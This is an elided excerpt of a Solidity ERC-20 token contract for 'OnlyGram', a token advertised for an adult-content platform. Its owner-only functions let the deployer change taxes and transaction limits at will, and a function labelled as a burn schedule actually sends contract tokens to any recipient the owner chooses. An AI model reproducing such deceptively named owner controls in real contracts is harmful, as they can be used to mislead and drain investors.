...
/*
OnlyGram is a decentralized NSFW platform for selling explicit content. Content Creators can now accept crypto including our native token as payment.

Telegram: https://t.me/onlygramapp
Investor Website: https://onlygram.space
Main Website: https://onlygr.am

Whitelist: https://onlygram.space/whitelist/
*/
...
contract ONLYGRAM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x4aB4A6c9804AA087c684f2Eb37d077A51B44a829); // Marketing Address
    address public _BurnSchedule_Address = 0x000000000000000000000000000000000000dEaD; // Fixed BurnSchedule
    ...
    uint256 private _tTotal = 1000000000000 * 10**0 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint public _BurnScheduleUnix =1632243600;

    string private _name = "OnlyGram";
    string private _symbol = "OGRAM";
    ...
    uint256 public _maxTxAmountBuy =   1000000000000 * 10**0 * 10**9;
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmountBuy =  1000000000000 * 10**0 * 10**9;
        _maxTxAmountSell = 1000000000000 * 10**0 * 10**9;
    }
    ...
    function Antibot() external onlyOwner {
        ...
        _sellTaxFee = 5;
        _sellLiquidityFee = 5;
        _maxTxAmountBuy =  1000 * 10**0 * 10**9;
    ...
    function ApproveBurnSchedule(address recipient , uint256 _amount) external onlyOwner(){
        uint256 amount = _amount * 10**_decimals;
         require(balanceOf(address(this)) >= amount,"Not Enough Tokens");
        _transfer(address(this),recipient,amount);
    }
    
    function setBurnScheduleUnix(uint BurnScheduleUnix) external onlyOwner(){
         _BurnScheduleUnix =BurnScheduleUnix;
